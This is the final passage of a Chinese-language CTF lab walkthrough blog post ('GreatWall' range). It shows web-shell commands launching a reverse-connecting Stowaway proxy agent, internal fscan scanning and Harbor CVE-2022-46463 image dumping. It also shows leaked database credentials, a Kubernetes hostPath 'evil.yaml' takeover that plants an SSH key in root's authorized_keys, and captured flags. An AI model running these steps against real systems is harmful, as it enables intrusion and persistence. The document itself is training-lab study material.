获得的终端没办法反弹，通过搜索引擎得知，环境中无法使用<code>post</code>的马，要使用<code>get</code>的马</p>\n<p>新建一个<code>GET</code>的马</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image54.png\" alt=\"image.png\"></p>\n<p>修改<code>.antproxy.php</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image55.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image56.png\" alt=\"image.png\"></p>\n<h2>二层代理搭建</h2>\n<p>通过antsword上传<code>stowaway</code>到<code>172.28.23.26</code></p>\n<p>通过一句话木马给予执行权限</p>\n<pre><code class=\"hljs language-bash\">http://172.28.23.26/upload/.antproxy.php?1=system(<span class=\"hljs-string\">'chmod %2Bx linux_x64_agent'</span>);\n</code></pre>\n<p>在<code>stowaway</code> 服务端的第一个node节点中开启<code>listen</code> 10000端口，也就是<code>172.28.23.17</code> 监听<code>10000</code>端口，等待<code>172.28.23.26</code> 来连接</p>\n<pre><code class=\"hljs language-bash\">(node 0) >> listen\n[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you<span class=\"hljs-string\">'re controlling was started in the corresponding way!\n[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!\n[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1\n[*] Please input the [ip:]&#x3C;port> : 10000\n[*] Waiting for response......\n[*] Node is listening on 10000\n</span></code></pre>\n<p>通过一句话木马进行连接</p>\n<pre><code class=\"hljs language-bash\">http://172.28.23.26/upload/.antproxy.php?1=system(<span class=\"hljs-string\">'./linux_x64_agent -c 172.28.23.17:10000 -s 123 --reconnect 8'</span>);\n</code></pre>\n<p><code>stowaway</code> 服务端接收到新节点</p>\n<pre><code class=\"hljs language-bash\">(admin) >>\n[*] New node online! Node <span class=\"hljs-built_in\">id</span> is 1\n(admin) >>\n[*] Please use <span class=\"hljs-string\">'exit'</span> to <span class=\"hljs-built_in\">exit</span> stowaway or use <span class=\"hljs-string\">'back'</span> to <span class=\"hljs-built_in\">return</span> to parent panel\n[*] Unknown Command!\n\n        <span class=\"hljs-built_in\">help</span>                                                    Show <span class=\"hljs-built_in\">help</span> information\n        detail                                                  Display connected nodes<span class=\"hljs-string\">' detail\n        topo                                                    Display nodes'</span> topology\n        use        &#x3C;<span class=\"hljs-built_in\">id</span>>                                         Select the target node you want to use\n        <span class=\"hljs-built_in\">exit</span>                                                    Exit Stowaway\n\n(admin) >> detail\nNode[0] -> IP: 8.130.146.145:46344  Hostname: portal  User: www-data\nMemo:\n\nNode[1] -> IP: 172.28.23.26:50314  Hostname: Null  User: Null\nMemo:\n</code></pre>\n<p>通过新节点开启<code>socks</code>服务</p>\n<pre><code class=\"hljs language-bash\">(admin) >> use 1\n(node 1) >> socks 1081 admin admin\n[*] Trying to listen on 0.0.0.0:1081......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<h2>内网信息收集 - 2</h2>\n<p>（这部分做麻烦了，不如在上一步做端口转发）</p>\n<p>通过<code>Backtrace UAF</code> 获得的终端收集内网<code>IP</code>信息，<code>172.22.14.x/24</code> 是二层内网网段</p>\n<pre><code class=\"hljs language-bash\">(www-data:/var/www/html/OAsystem/upload) $ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:0c:c8:c9 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe0c:c8c9/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n3: eth1: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:0c:c8:a0 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe0c:c8a0/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>在通过<code>Backtrace UAF</code> 获得的终端进行<code>fscan</code>扫描</p>\n<pre><code class=\"hljs language-bash\">(www-data:/var/www/html/OAsystem/upload) $ ./fscan_1.8.4 -h 172.22.14.1-255 > 1.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">start infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.14.6     is alive\n(icmp) Target 172.22.14.37    is alive\n(icmp) Target 172.22.14.46    is alive\n[*] Icmp alive hosts len is: 3\n172.22.14.46:80 open\n172.22.14.46:22 open\n172.22.14.37:22 open\n172.22.14.6:80 open\n172.22.14.6:22 open\n172.22.14.6:21 open\n172.22.14.37:10250 open\n172.22.14.37:2379 open\n[*] alive ports len is: 8\nstart vulscan\n[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor\n[*] WebTitle http://172.22.14.6        code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413\n[+] InfoScan http://172.22.14.46       [Harbor] \n[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None\n[+] ftp 172.22.14.6:21:anonymous \n   [->]OASystem.zip\n[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]\n</code></pre>\n<h2>172.22.14.46 - Harbor</h2>\n<p>访问，采集指纹</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image57.png\" alt=\"image.png\"></p>\n<p>上面 fscan 扫描出 <code>poc-yaml-swagger-ui-unauth</code> 应该是接口泄露</p>\n<p>通过搜索引擎检索，发现是未授权访问，通过<code>GitHub</code>寻找利用：<a href=\"https://github.com/404tk/CVE-2022-46463\">https://github.com/404tk/CVE-2022-46463</a></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46                           \n[*] API version used v2.0\n[+] project/projectadmin\n[+] project/portal\n[+] library/nginx\n[+] library/redis\n[+] harbor/secret\n</code></pre>\n<p><code>harbor/secret</code> 看着像是我们感兴趣的，<code>project/projectadmin</code>也像是，Dump下来</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2\n[+] Dumping : harbor/secret:latest\n    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50\n/root/Desktop/test/greatwall/CVE-2022-46463/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.\n  tf.extractall(f<span class=\"hljs-string\">\"{CACHE_PATH}{dir}/{name}\"</span>)\n    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01\n    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\n    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e\n    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49\n    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2\n[+] Dumping : project/projectadmin:latest\n    [+] Downloading : 63e9bbe323274e77e58d77c6ab6802d247458f784222fbb07a2556d6ec74ee05\n/root/Desktop/test/greatwall/CVE-2022-46463/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.\n  tf.extractall(f<span class=\"hljs-string\">\"{CACHE_PATH}{dir}/{name}\"</span>)\n    [+] Downloading : a1ae0db7d6c6f577c8208ce5b780ad362ef36e69d068616ce9188ac1cc2f80c6\n    [+] Downloading : 70437571d98143a3479eaf3cc5af696ea79710e815d16e561852cf7d429736bd\n    [+] Downloading : ae0fa683fb6d89fd06e238876769e2c7897d86d7546a4877a2a4d2929ed56f2c\n    [+] Downloading : 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c\n</code></pre>\n<p>分析<code>harbor/secret</code> 的镜像文件，能找到<code>flag05</code></p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest  <span class=\"hljs-built_in\">ls</span>\n413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49\n58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50\n8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653\nb51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01\nbuild_history.txt\nda8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\nfb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e\n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest  <span class=\"hljs-built_in\">cd</span> 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49 \n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49  <span class=\"hljs-built_in\">ls</span>                                                                 \nf1ag05_Yz1o.txt  run.sh\n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49  <span class=\"hljs-built_in\">cat</span> f1ag05_Yz1o.txt                                                \nflag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}# \n</code></pre>\n<p>分析<code>project/projectadmin</code> 的镜像文件，能找到**<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>** ，并且在<code>run.sh</code>中运行了</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c  <span class=\"hljs-built_in\">cat</span> run.sh                                                         \n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-built_in\">sleep</span> 1\n\n<span class=\"hljs-comment\"># start</span>\njava -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar\n/usr/bin/tail -f /dev/null#                                                                                                                                                                                                         \n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c  <span class=\"hljs-built_in\">ls</span> -al app  \n总计 28888\ndrwxrwxrwx 2 root root     4096 2024年 3月25日 .\ndrwxr-xr-x 7 root root     4096  3月29日 12:54 ..\n-rwxrwxrwx 1 root root 29573051 2024年 3月25日 ProjectAdmin-0.0.1-SNAPSHOT.jar\n</code></pre>\n<p>将<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>拿到<code>JD-gui</code>中反编译</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image58.png\" alt=\"image.png\"></p>\n<p>在spring配置文件中能找到数据库账号密码<code>root:My3q1i4oZkJm3</code></p>\n<p>新建规则</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image59.png\" alt=\"image.png\"></p>\n<p>再通过<code>MDUT</code>进行连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image60.png\" alt=\"image.png\"></p>\n<p>直接梭哈</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image61.png\" alt=\"image.png\"></p>\n<p>读取<code>flag06</code></p>\n<pre><code class=\"hljs language-bash\">flag{413ac6ad-1d50-47cb-9cf3-17354b751741}\n</code></pre>\n<h2>172.22.14.37 - K8s</h2>\n<p>PS：K8S一点不会，看着WP打的</p>\n<p>通过<code>fscan</code>扫描，<code>172.22.14.37</code>开启了10250端口，也就是<code>K8s</code>的端口（云安全方面）</p>\n<p>通过上面的方法扫描一次<code>172.22.14.37</code> 的端口</p>\n<pre><code class=\"hljs language-bash\">(www-data:/var/www/html/OAsystem/upload) $ ./fscan_1.8.4 -h 172.22.14.37 -p 1-65535 > 1.txt\n(www-data:/var/www/html/OAsystem/upload) $ <span class=\"hljs-built_in\">cat</span> 1.txt\n172.22.14.37:22 open\n172.22.14.37:2380 open\n172.22.14.37:2379 open\n172.22.14.37:6443 open\n172.22.14.37:10256 open\n172.22.14.37:10250 open\n172.22.14.37:10252 open\n172.22.14.37:10251 open\n[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None\n[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None\n[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None\n[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None\n[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None\n[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak \n[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth\n</code></pre>\n<p>存在<code>6443</code>等端口，存在 <code>Kubernetes API server</code> 未授权访问</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image62.png\" alt=\"image.png\"></p>\n<p><code>kubectl.exe</code>：<a href=\"https://storage.googleapis.com/kubernetes-release/release/v1.7.0/bin/windows/amd64/kubectl.exe\">https://storage.googleapis.com/kubernetes-release/release/v1.7.0/bin/windows/amd64/kubectl.exe</a></p>\n<p>编写恶意<code>yaml</code>文件<code>evil.yaml</code></p>\n<pre><code class=\"hljs language-bash\">apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        volumeMounts:\n        - mountPath: /mnt\n          name: test-volume\n      volumes:\n      - name: test-volume\n        hostPath:\n          path: /\n</code></pre>\n<pre><code class=\"hljs language-bash\">kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil.yaml\n</code></pre>\n<pre><code class=\"hljs language-bash\">kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default\n</code></pre>\n<pre><code class=\"hljs language-bash\">kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ <span class=\"hljs-built_in\">exec</span> -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxx\"</span> > /mnt/root/.ssh/authorized_keys\n</code></pre>\n<p><code>ssh</code>私钥登录</p>\n<pre><code class=\"hljs language-bash\">ssh -i /home/kali/.ssh/id_rsa root@172.22.14.37\n</code></pre>\n<pre><code class=\"hljs language-bash\">use flaghaha;\n<span class=\"hljs-keyword\">select</span> * from flag04;\n</code></pre>\n<pre><code class=\"hljs language-bash\">ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==\nflag{da69c459-7fe5-4535-b8d1-15fff496a29f}\n</code></pre>\n<h2>总结</h2>\n<p>见到自己的很多不足，以及很多没用过，比如最后的<code>K8s</code> 未授权，还有中间的<code>PWN</code></p>\n<p>后面补全<code>K8s</code> 的知识，以后再复盘该靶机</p>","title":"春秋云镜 - GreatWall","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","综合靶场"],"categories":"靶机","description":"GreatWall\n\n https://yunjing.ichunqiu.com/major/detail/1171?type=2\n \n\n\n\n8.130.146.145\n\n前期踩点\n\n\n\n访问`HTTP`服务，并提取指纹\n\n\n\n访问`8080`端口，是管理页面\n\n\n\nWEB渗透 - 1\n\n手动测试了以下弱密码等方法，但是根本没有将数据传过去，使用`fscan`扫描一波\n\n\n\n扫描出存在`Think..."},"recentPosts":[{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"}]},"__N_SSG":true}